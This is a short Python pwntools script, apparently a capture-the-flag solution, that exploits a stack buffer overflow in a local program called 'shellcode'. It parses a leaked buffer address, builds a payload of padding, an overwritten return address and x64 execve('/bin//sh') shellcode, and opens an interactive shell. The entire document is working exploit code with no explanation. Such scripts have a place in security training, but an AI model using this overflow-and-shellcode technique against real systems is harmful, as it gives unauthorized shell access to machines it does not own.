# --*-- coding:utf-8 --*--
from pwn import *

p = process('./shellcode')

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True)
buf_addr = int(buf_addr, 16)

payload = 'a'*24+p64(buf_addr+32)+shellcode_x64
print(len(payload))
p.sendline(payload)
p.interactive()